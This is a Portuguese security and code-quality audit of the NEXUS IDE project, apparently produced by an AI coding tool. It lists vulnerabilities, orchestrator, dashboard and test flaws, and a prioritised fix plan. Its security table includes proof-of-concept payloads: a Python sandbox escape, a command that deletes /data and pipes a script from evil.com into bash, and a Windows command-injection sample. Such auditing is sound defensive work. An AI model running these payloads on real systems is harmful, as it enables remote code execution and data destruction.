# 🔴 AUDITORIA CRÍTICA COMPLETA — NEXUS IDE
**Data:** 2026-06-09  
**Auditor:** Kimi Code CLI (Multi-Agent Analysis)  
**Scope:** Backend, Frontend, Dashboard, Orchestrator, Security, Performance, Tests, Agents  
**Método:** 8 subagents de exploração + testes funcionais manuais + análise comparativa

---

## RESUMO EXECUTIVO

O NEXUS IDE é um projeto **conceptualmente sólido** mas **imaduro para produção**. Foram identificados **42 problemas críticos/altos** distribuídos por todas as camadas, incluindo:

- **3 vulnerabilidades de segurança CRÍTICAS** (RCE, sandbox bypass, path traversal)
- **7 falhas de arquitetura CRÍTICAS** no orquestrador (timeouts não implementados, memory leaks, cancelamento quebrado)
- **6 bugs CRÍTICOS** na dashboard (SSE+polling duplicado, latência falsa, dados estáticos)
- **1 bug CRÍTICO** de compatibilidade Windows (terminal não funciona)
- **Código duplicado massivo** entre agentes (13 agentes com implementação idêntica)
- **Todos os modelos apontam para `llama3.1:8b`** — o tier system é uma farsa
- **Suite de testes com timeout crónico** e CI de segurança que nunca falha
- **Frontend com login bloqueado** (loading infinito + requests 401 em loop)

> **Veredito:** Não é "Production Ready". Requer refactoring significativo antes de qualquer deploy.

---

## 1. 🚨 VULNERABILIDADES DE SEGURANÇA

### CRÍTICO

| # | Vulnerabilidade | Ficheiro | Impacto | PoC |
|---|----------------|----------|---------|-----|
| **S1** | **Sandbox Python Bypass via AST** — `__import__('o'+'s').system('id')` passa validação AST | `workspace_security.py:428` | RCE quando Docker indisponível | `getattr(importlib, 'import_'+'module')('os').system('whoami')` |
| **S2** | **Fallback subprocess = sem sandbox** — `bash -c code` executa no host | `sandbox/executor.py:319` | RCE total no host | `bash -c 'rm -rf /data && wget evil.com/shell.sh \| bash'` |
| **S3** | **Terminal execute crash no Windows** — `asyncio.create_subprocess_exec` não implementado no Windows, causa 500 Internal Server Error | `sandbox/executor.py:154` | Terminal completamente inoperável no Windows | `POST /api/terminal/execute` → 500 |

### ALTO

| # | Vulnerabilidade | Ficheiro | Impacto |
|---|----------------|----------|---------|
| **S4** | Windows Drive-Relative Path Bypass — `C:Windows\System32` passa como relativo | `file_api.py`, `workspace_security.py` | Leitura/escrita em qualquer ficheiro do sistema |
| **S5** | CMD Injection via `&` — não filtrado no Windows | `workspace_shell.py` | Execução arbitrária via `echo hello & calc.exe` |
| **S6** | CWD Path Traversal em Shell — `cwd` não validado contra allowed bases | `workspace_shell.py`, `terminal.py` | Execução de comandos em diretórios sensíveis |
| **S7** | Upload Path Traversal — `project_path` não validado | `routes/files.py:198` | Upload para qualquer diretório |
| **S8** | CORS wildcard permissivo com credentials | `main.py:188` | CSRF com credenciais |
| **S9** | JWT default secret em dev aceito sem bloqueio | `settings.py:108` | Forja de tokens se ENV=development em deploy |

### MÉDIO

| # | Vulnerabilidade | Ficheiro |
|---|----------------|----------|
| S10 | SQLi em nomes de colunas (dynamic query) | `db.py:397` |
| S11 | Rate limit bypass via X-Forwarded-For spoofing | `rate_limit.py:24` |
| S12 | Leitura arbitrária no home directory permitida | `workspace_security.py:218` |
| S13 | `.ps1` permitido em uploads (PowerShell) | `file_api.py`, `routes/files.py` |
| S14 | File lock readers counter race condition | `file_locks.py` |

---

## 2. ⚙️ ORQUESTRADOR — FALHAS ARQUITETURAIS

### CRÍTICO

| # | Problema | Ficheiro | Detalhe |
|---|----------|----------|---------|
| **O1** | **AgentPool completamente ignorado pelo Engine** | `engine.py` + `agent_pool.py` | `max_parallel=5` nunca usado. 20 tasks independentes = 20 chamadas simultâneas ao Ollama |
| **O2** | **Timeout de 300s definido mas NUNCA implementado** | `engine.py:122` | Chamadas LLM bloqueiam indefinidamente |
| **O3** | **Cancelamento "soft" não funciona** | `engine.py:326` | `cancel()` seta evento mas tasks em execução no LLM continuam até ao fim |
| **O4** | **Dicionários de estado crescem infinitamente** | `engine.py:133` | `_plans`, `_session_plans`, `_active_runs`, `_state`, `_cancellation_events` sem TTL/eviction |
| **O5** | **Sem `try/finally` em `execute_plan`** | `engine.py:260` | Exceções deixam estado em `EXECUTING` para sempre |
| **O6** | **Fallback captura apenas 3 tipos de exceção** | `fallback.py:73` | `ValueError`, `RuntimeError`, `TimeoutError`, `ConnectionError` propagam e derrubam a chain |
| **O7** | **EventBus bloqueia indefinidamente** | `events.py:126` | Subscriber lento paralisa todo o event bus |

### ALTO

| # | Problema | Ficheiro |
|---|----------|----------|
| O8 | AgentPool não thread-safe (race em criação de semáforo) | `agent_pool.py:54` |
| O9 | `release()` sem verificar `acquire()` prévio | `agent_pool.py:71` |
| O10 | `_LazyRegistry` não thread-safe | `registry.py:136` |
| O11 | Retry backoff sem jitter (thundering herd) | `engine.py:689` |
| O12 | Tasks dependentes de tasks falhadas nunca marcadas como SKIPPED | `dependency_graph.py:202` |
| O13 | `_classify_by_llm` sem timeout | `smart_router.py:214` |
| O14 | `_active_runs` armazena tasks mas nunca as cancela | `engine.py:133` |

---

## 3. 📊 DASHBOARD — PROBLEMAS CRÍTICOS

### CRÍTICO

| # | Problema | Ficheiro | Impacto |
|---|----------|----------|---------|
| **D1** | **Polling eterno após fallback SSE** | `metricsStore.ts:136` | SSE volta → polling continua em paralelo eternamente. DDoS local com 1 req/3s |
| **D2** | **Latência falsa em health checks** | `SystemHealth.tsx:28` | `localLlmRes` e `backendRes` usam mesmo timestamp do `Promise.allSettled` |
| **D3** | **Storm de health checks** | `SystemHealth.tsx:97` | `performHealthChecks` recria-se a cada 3s porque `backendOnline` está no dependency array |
| **D4** | **RequestFlow 100% estático/hardcoded** | `RequestFlow.tsx:107` | Diagrama emoji+setas não reflete estado real. Mostra informação fictícia como real |

### ALTO

| # | Problema | Ficheiro |
|---|----------|----------|
| D5 | Ausência total de chat input / command bar / terminal na dashboard | `page.tsx` |
| D6 | `initMetricsStream()` sem `stopMetricsStream()` no cleanup | `page.tsx:26` |
| D7 | Alertas apagados quando backend offline | `AlertFeed.tsx:37` |
| D8 | `applySuggestion` com catch vazio (loading infinito) | `GuardianWidget.tsx:102` |
| D9 | `setLoading(true)` sem proteção contra desmontagem | `RequestFlow.tsx:25` |

### FUNCIONALIDADES EM FALTA (vs World-Class)

| Funcionalidade | Prioridade | Estado |
|----------------|------------|--------|
| Chat Input / Quick Command | P0 | ❌ Totalmente ausente |
| Terminal / Execução de comandos | P0 | ❌ Não existe na dashboard |
| GPU / VRAM Metrics | P0 | ❌ Zero menção a GPU |
| Controlo de Agentes (Pause/Restart/Abort) | P1 | ❌ Apenas visualização |
| Logs em tempo real | P1 | ❌ Não existe |
| Timeline de Execução / Missões | P1 | ❌ Página separada desconectada |
| Plan → Review → Act Workflow | P0 | ❌ Inexistente |
| Diff viewer / code review inline | P0 | ❌ Inexistente |

---

## 4. 🤖 AGENTES — PROBLEMAS CRÍTICOS

### CRÍTICO

| # | Problema | Ficheiro | Detalhe |
|---|----------|----------|---------|
| **A1** | **Código duplicado massivo** — 13 agentes idênticos | `coder.py`, `debugger.py`, `analyzer.py`, etc. | Todos fazem apenas `async for token in self._run_react_loop(request): yield token` |
| **A2** | **Todos os modelos apontam para `llama3.1:8b`** | `config/models.yaml` | Tier system é teatro. `nano`, `expert`, `vision` — todos o mesmo modelo |
| **A3** | **Guardian NÃO HERDA de AgentBase** | `guardian.py` | Não tem `model_key`, `prompt_file`, `supported_actions`. Orchestrator não o trata como agente de 1ª classe |
| **A4** | **Falta de timeout no ReAct loop** | `base.py` | Se Ollama ficar preso, agente bloqueia indefinidamente |
| **A5** | **Memory leak em loops de background** | `dashboard_agent.py`, `guardian.py`, `overseer.py` | Dicionários/records crescem sem limite |

### ALTO

| # | Problema | Ficheiro |
|---|----------|----------|
| A6 | `supervisor.py` descarta estatísticas recolhidas | `supervisor.py` |
| A7 | `DashboardAgent` ignora `request.history` e `request.context` | `dashboard_agent.py` |
| A8 | Prompts conflituosos — 4 formatos de tool calls diferentes | `base.py` + `coder.md` |
| A9 | `router.md` desatualizado (faltam ~25% dos agentes) | `router.md` |
| A10 | `overseer.md` inexistente | `overseer.py` |
| A11 | `__init__.py` com `__all__` sobrescrito — exporta apenas 9 agentes | `agents/__init__.py` |

---

## 5. ⚡ PERFORMANCE — BOTTLENECKS

### CRÍTICO

| # | Problema | Ficheiro | Impacto |
|---|----------|----------|---------|
| **P1** | **Concatenação O(n²) em hot path** | `engine.py:195` | `plan_content += token` token-a-token. Em planos grandes, 10-100x mais lento |
| **P2** | **Memory leak em dicionários de sessão** | `engine.py:133` | OOM em uso prolongado |
| **P3** | **Frontend: array de mensagens sem limite** | `ChatStream.tsx:23` | UI fica lenta após ~50 mensagens; congela após 200+ |

### ALTO

| # | Problema | Ficheiro |
|---|----------|----------|
| P4 | Imports síncronos pesados no startup | `main.py:23` |
| P5 | `ctx.global_context` concatenação crescente | `engine.py:655` |
| P6 | Guardian bloqueia event loop 500ms a cada 30s | `guardian.py:119` |
| P7 | AirLLM gera texto completo antes do 1º yield (falso streaming) | `airllm_provider.py:776` |

---

## 6. 🧪 TESTES & CI/CD — FALHAS

### CRÍTICO

| # | Problema | Detalhe |
|---|----------|---------|
| **T1** | **Teste `test_collaboration_layer_e2e.py::test_parallel_writes_via_api` causa timeout global** | Usa `threading.Thread` com `TestClient` → deadlock no portal AnyIO |
| **T2** | **CI de segurança nunca falha** | `bandit ... || true` e `safety check ... || echo` — sempre passam |
| **T3** | **Cobertura real ≠ declarada** | `.coverage` no disco tem apenas 16 ficheiros. Threshold 70% é ilusório |

### ALTO

| # | Problema | Detalhe |
|---|----------|---------|
| T4 | ~30 testes de resilience LLM desativados (`@pytest.mark.skip`) | Fallback de LLM nunca validado na CI |
| T5 | Testes E2E reais inexistentes | Nenhum teste valida stack completo |
| T6 | Mock overuse massivo | `test_health.py`, `test_engine.py`, `test_smart_router.py` testam apenas mocks |

---

## 7. 🎨 FRONTEND — BUGS CRÍTICOS

### CRÍTICO

| # | Problema | Ficheiro | Detalhe |
|---|----------|----------|---------|
| **F1** | **Login bloqueado em loading infinito** | `login/page.tsx` | Página de login não renderiza formulário — fica em spinner eterno |
| **F2** | **Requests 401 em loop infinito** | `app/layout.tsx` ou provider | Frontend faz `GET /api/models/status` repetidamente sem token → 401 → retry |
| **F3** | **Memory leak no streaming** | `useAgentStream.ts` | `reader.read()` continua após desmontagem do componente |

### ALTO

| # | Problema | Ficheiro |
|---|----------|----------|
| F4 | Race condition em modo Plan — cria planos duplicados | `ChatPanel.tsx` |
| F5 | `ChatStream.tsx` é 100% mock/ficheiro morto | `ChatStream.tsx` |
| F6 | `useMetrics` cria EventSource próprio em vez de usar `metricsStore` | `useMetrics.ts` |
| F7 | Polling de planos não limpa interval ao mudar de sessão | `ChatPanel.tsx` |

---

## 8. 🔧 TESTES FUNCIONAIS REALIZADOS

| Endpoint | Resultado | Notas |
|----------|-----------|-------|
| `GET /health` | ✅ 200 OK | Responde rapidamente |
| `GET /health?deep=true` | ✅ 200 OK | `guardian_agent: stopped` — confirma problema |
| `GET /api/metrics/current` | ✅ 200 OK | Dados reais do sistema |
| `POST /api/auth/register` | ✅ 400 (já existe) | Validação funciona |
| `POST /api/auth/login` | ✅ 200 OK + JWT | Auth funcional |
| `POST /api/files/read` | ✅ 200 OK (com token) | Lê ficheiros corretamente |
| `POST /api/terminal/execute` | ❌ 500 Internal Server Error | `NotImplementedError` no Windows (asyncio subprocess) |
| `POST /api/chat` | ⚠️ Timeout após 60s | Routing funciona (escolhe MICRO), mas Ollama indisponível |
| `POST /api/plan` | ❌ 404 Not Found | Rota não existe ou tem prefixo diferente |
| `GET /api/missions` | ❌ 401/404 | Requer auth / rota inexistente |
| `GET /api/models/status` | ❌ Falha | Ollama não disponível |
| Frontend `http://localhost:3000` | ❌ Login bloqueado | Loading spinner eterno + requests 401 em loop |

### Infraestrutura

| Serviço | Estado |
|---------|--------|
| Backend FastAPI | ✅ A correr na porta 8000 |
| Frontend Next.js | ⚠️ A correr mas login bloqueado |
| Ollama | ❌ Não disponível |
| Redis | ❌ Não disponível (localhost:6379 recusado) |
| Docker | ❌ Não disponível / não testado |
| SQLite | ✅ 17 tabelas, 6 users, 193 messages |

---

## 9. 📋 PLANO DE AÇÃO PRIORITÁRIO

### 🔴 P0 — CORRIGIR IMEDIATAMENTE (Bloqueante para qualquer uso)

1. **Corrigir terminal no Windows** — Substituir `asyncio.create_subprocess_exec` por `asyncio.create_subprocess_shell` com `asyncio.subprocess.Process` ou usar `subprocess.run` em thread pool
2. **Implementar timeout real no Engine** — `asyncio.timeout()` em `_execute_task` e `_classify_by_llm`
3. **Adicionar TTL/eviction aos dicionários de estado** — `cachetools.TTLCache` ou cleanup periódico
4. **Integrar AgentPool no Engine** — `async with self._agent_pool.slot(task.agent):`
5. **Fixar login do frontend** — Resolver loading infinito e requests 401 em loop
6. **Remover loop infinito de 401 no frontend** — Não fazer requests a endpoints protegidos sem token válido
7. **Corrigir sandbox Python** — Bloquear `getattr` com literais concatenados, `__builtins__`
8. **Desativar fallback subprocess inseguro** — Recusar execução se Docker indisponível, ou usar sandbox OS-level
9. **Criar classe `ReActAgent`** — Eliminar duplicação entre os 13 agentes idênticos
10. **Corrigir `execute_script`** — Aplicar `_check_python_sandbox` antes de executar `.py`

### 🟠 P1 — ALTA PRIORIDADE (Impacto significativo)

11. Implementar cancelamento real de tasks (`task.cancel()`)
12. Adicionar `try/finally` em `execute_plan` para cleanup garantido
13. Corrigir SSE+polling duplicado na dashboard (`metricsStore.ts`)
14. Corrigir latência falsa e storm de health checks (`SystemHealth.tsx`)
15. Adicionar chat input / command bar na dashboard
16. Corrigir CORS wildcard com credentials
17. Validar todos os paths de utilizador com `_is_blocked_path()`
18. Corrigir JWT default secret (gerar aleatório em runtime)
19. Sincronizar `router.md` com agentes reais
20. Criar `overseer.md` ou remover referência

### 🟡 P2 — MÉDIA PRIORIDADE (Melhorias)

21. Adicionar GPU/VRAM metrics à dashboard
22. Implementar Plan → Review → Act workflow
23. Adicionar diff viewer para revisão de código
24. Corrigir cobertura real dos testes (remover teste que causa timeout)
25. Corrigir CI de segurança (remover `|| true`)
26. Adicionar testes E2E reais (FastAPI completo → agente → resposta)
27. Implementar virtualização de mensagens no chat (`react-window`)
28. Corrigir memory leaks em loops de background (Guardian, Dashboard, Overseer)
29. Corrigir `models.yaml` — usar modelos reais ou simplificar tiers
30. Adicionar tratamento de erro no frontend (toast notifications, estados de erro)

---

## 10. 📊 SCORE CARD

| Área | Score | Notas |
|------|-------|-------|
| **Segurança** | 4/10 | 3 RCEs críticos, path traversal, CMD injection |
| **Arquitetura (Backend)** | 5/10 | Conceito bom, execução fraca (timeouts, leaks, races) |
| **Performance** | 5/10 | Hot paths O(n²), bloqueios síncronos, falta de cache |
| **Dashboard/UX** | 4/10 | Visualmente competente, funcionalmente incompleta |
| **Frontend Estabilidade** | 3/10 | Login bloqueado, memory leaks, races |
| **Testes/Qualidade** | 4/10 | Volume alto, profundidade baixa, CI quebrada |
| **Agentes** | 5/10 | Base sólida, duplicação massiva, prompts conflituosos |
| **Documentação** | 6/10 | Boa estrutura, mas comentários mentem sobre modelos |
| **Observabilidade** | 6/10 | Métricas decentes, mas Guardian stopped, dados estáticos |
| **Compatibilidade Windows** | 3/10 | Terminal não funciona, paths problemáticos |

**Score Global: 4.5/10**

---

## CONCLUSÃO

O NEXUS IDE tem **boas fundações arquiteturais** (FastAPI, ReAct, event bus, shared memory) mas falha **gravemente na execução** e na **maturidade para produção**. Os problemas mais perigosos são:

1. **Segurança:** RCE via sandbox bypass e fallback subprocess
2. **Estabilidade:** Timeouts não implementados, memory leaks, cancelamento quebrado
3. **Usabilidade:** Login bloqueado, dashboard read-only, terminal inoperável no Windows
4. **Manutenibilidade:** Código duplicado massivo, prompts desatualizados, model.yaml mentiroso

Recomendação: **Não deployar em produção** antes de resolver os itens P0. Priorizar segurança e estabilidade sobre novas funcionalidades.
